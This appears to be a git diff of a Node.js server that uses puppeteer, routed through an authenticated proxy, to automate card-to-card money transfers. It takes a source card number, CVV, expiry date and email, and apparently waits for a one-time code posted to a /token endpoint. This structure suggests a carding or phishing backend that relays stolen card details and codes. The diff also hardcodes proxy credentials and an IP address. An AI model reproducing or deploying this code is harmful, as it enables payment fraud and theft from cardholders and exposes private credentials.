@@ -20,7 +20,7 @@ app.use(bodyParser.json())
 app.use(cors())
 
 const write_data = async (toCard, amount, fromCard,cvv, expireDate, email) => {
-    const browser = await puppeteer.launch({args: ['--proxy-server=http://194.85.181.191:51933',' --no-sandbox', '--disable-setuid-sandbox']})
+    const browser = await puppeteer.launch({headless: false, slowMo: 20, args: ['--proxy-server=http://194.85.181.191:51933',' --no-sandbox', '--disable-setuid-sandbox']})
     const page = await browser.newPage()
     await page.authenticate({ username: 'ttNkVLRS', password: '63cYXNdr'})
     await page.setViewport({ width: 1920, height: 984 })
@@ -56,12 +56,14 @@ const write_data = async (toCard, amount, fromCard,cvv, expireDate, email) => {
     await page.waitForSelector('input')
 
     obj[toCard+fromCard] = null
+    console.log("wait")
     function doStuff() {
       if(!obj[toCard+fromCard]) {//we want it to match
           setTimeout(doStuff, 50);//wait 50 millisecnds then recheck
           return;
       }
     }
+    console.log("obj")
   
     doStuff();
 
@@ -98,5 +100,5 @@ app.get('/token/:id/:code', async (req, res) => {
   return res.status(200).send()
 })
 
-app.listen(80)
+app.listen(5000)
 https.createServer(options, app).listen(443);
